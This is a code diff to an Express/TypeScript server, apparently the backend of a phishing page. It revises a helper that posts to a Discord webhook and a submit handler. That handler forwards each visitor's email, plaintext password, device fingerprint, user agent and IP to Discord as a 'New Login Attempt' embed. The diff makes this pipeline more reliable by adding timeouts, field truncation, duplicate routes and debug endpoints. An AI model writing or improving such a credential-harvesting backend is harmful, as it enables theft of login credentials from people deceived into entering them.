@@ -67,56 +67,104 @@ async function startServer() {
     next();
   });
 
-  // API routes
   // Helper to send Discord webhooks with runtime-agnostic fetch handling
   async function sendDiscordWebhook(webhookUrl: string, payload: any) {
     if (!webhookUrl) {
-      console.error('Discord webhook URL missing');
+      console.error('❌ Discord webhook URL missing');
       return { ok: false, status: 0, body: 'no webhook url' };
     }
 
-    // Resolve a fetch implementation: prefer global fetch, fallback to dynamic import
-    let runtimeFetch: typeof fetch | null = null;
-    if (typeof fetch === 'function') {
-      runtimeFetch = fetch;
+    // Resolve a fetch implementation: prefer global fetch, fallback to undici
+    let fetchFn: typeof fetch | null = null;
+    if (typeof globalThis.fetch === 'function') {
+      console.log('✓ Using globalThis.fetch');
+      fetchFn = globalThis.fetch;
     } else {
       try {
+        console.log('⚠ Global fetch not available, trying undici...');
         const undici = await import('undici');
-        // undici exports a fetch function
-        // @ts-ignore
-        runtimeFetch = undici.fetch;
+        fetchFn = undici.fetch;
+        console.log('✓ Loaded undici.fetch');
       } catch (e) {
-        console.error('No global fetch and failed to import undici:', e);
+        console.error('❌ No global fetch and failed to import undici:', e);
         return { ok: false, status: 0, error: String(e) };
       }
     }
 
     try {
-      const res = await runtimeFetch!(webhookUrl, {
+      console.log(`[Discord] Sending webhook...`);
+      console.log('[Discord] URL:', webhookUrl.substring(0, 60) + '...');
+      
+      const fetchOptions: any = {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      });
-
-      const text = await res.text();
+        body: JSON.stringify(payload)
+      };
+      
+      // Add timeout if AbortController is available
+      if (typeof AbortController !== 'undefined') {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+        fetchOptions.signal = controller.signal;
+      }
+      
+      const res = await fetchFn(webhookUrl, fetchOptions);
+      
+      let text = '';
+      try {
+        text = await res.text();
+      } catch {
+        text = '(unable to read response body)';
+      }
+      
+      console.log(`[Discord] Status: ${res.status}`);
+      console.log(`[Discord] Response: ${text.substring(0, 300)}`);
+      
       if (!res.ok) {
-        console.error('Discord webhook failed:', res.status, text);
+        console.error('❌ Discord webhook failed:', res.status, text);
         return { ok: false, status: res.status, body: text };
       }
+      
+      console.log('✓ Discord webhook sent successfully');
       return { ok: true, status: res.status, body: text };
     } catch (err) {
-      console.error('Error sending Discord webhook:', err);
+      console.error('[Discord] ❌ Fatal error:', err instanceof Error ? err.message : String(err));
+      console.error('[Discord] Error stack:', err instanceof Error ? err.stack : '(no stack)');
       return { ok: false, status: 0, error: String(err) };
     }
   }
 
+  // health & debug endpoints
   app.get("/api/health", (req, res) => {
     res.json({ status: "ok" });
   });
+  app.get("/functions/health", (req, res) => {
+    res.json({ status: "ok" });
+  });
 
-  app.post("/api/submit", async (req, res) => {
+  app.get("/api/debug", (req, res) => {
+    res.json({
+      webhookUrl: process.env.DISCORD_WEBHOOK_URL ? `***${process.env.DISCORD_WEBHOOK_URL.slice(-20)}` : 'NOT SET',
+      nodeVersion: process.version,
+      hasGlobalFetch: typeof globalThis.fetch === 'function'
+    });
+  });
+  app.get("/functions/debug", (req, res) => {
+    res.json({
+      webhookUrl: process.env.DISCORD_WEBHOOK_URL ? `***${process.env.DISCORD_WEBHOOK_URL.slice(-20)}` : 'NOT SET',
+      nodeVersion: process.version,
+      hasGlobalFetch: typeof globalThis.fetch === 'function'
+    });
+  });
+
+  // handler reused for both /api/submit and /functions/submit for dev convenience
+  const submitHandler = async (req: express.Request, res: express.Response) => {
     const { email, password, fingerprint, theme } = req.body;
     const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+
+    console.log('\n=== submit called ===', req.path);
+    console.log('Request body:', { email, password: '***', fingerprint: fingerprint?.substring(0, 20), theme });
+    console.log('Webhook URL set:', !!webhookUrl);
 
     if (!webhookUrl) {
       console.error("DISCORD_WEBHOOK_URL is not set");
@@ -130,29 +178,39 @@ async function startServer() {
             title: "New Login Attempt",
             color: 0xff4b33,
             fields: [
-              { name: "Email", value: email || "N/A", inline: true },
-              { name: "Password", value: password || "N/A", inline: true },
-              { name: "Theme", value: theme || "Default", inline: true },
-              { name: "Fingerprint", value: `\`\`\`${fingerprint || "N/A"}\`\`\`` },
-              { name: "User Agent", value: req.headers['user-agent'] || "N/A" },
-              { name: "IP", value: req.ip || "N/A" }
+              { name: "Email", value: (email || "N/A").toString().substring(0, 1024), inline: true },
+              { name: "Password", value: (password || "N/A").toString().substring(0, 1024), inline: true },
+              { name: "Theme", value: (theme || "Default").toString().substring(0, 1024), inline: true },
+              { name: "Fingerprint", value: `\`\`\`${(fingerprint || "N/A").toString().substring(0, 1024)}\`\`\`` },
+              { name: "User Agent", value: (req.headers['user-agent'] || "N/A").toString().substring(0, 1024) },
+              { name: "IP", value: (req.ip || "N/A").toString().substring(0, 1024) }
             ],
             timestamp: new Date().toISOString()
           }
         ]
       };
 
+      console.log('Sending Discord payload:', JSON.stringify(payload).substring(0, 500) + '...');
       const result = await sendDiscordWebhook(webhookUrl, payload);
+      
+      console.log('Discord response:', result);
+      
       if (!result.ok) {
+        console.error('Webhook failed with status', result.status);
         return res.status(500).json({ error: 'Failed to submit', details: result });
       }
 
+      console.log('✅ Submit successful');
       res.json({ status: "ok" });
     } catch (error) {
-      console.error("Error submitting to Discord:", error);
-      res.status(500).json({ error: "Failed to submit" });
+      console.error("❌ Error submitting to Discord:", error);
+      res.status(500).json({ error: "Failed to submit", message: String(error) });
     }
-  });
+  };
+
+  app.post("/api/submit", submitHandler);
+  app.post("/functions/submit", submitHandler);
+
 
   // Vite middleware for development
   if (process.env.NODE_ENV !== "production") {
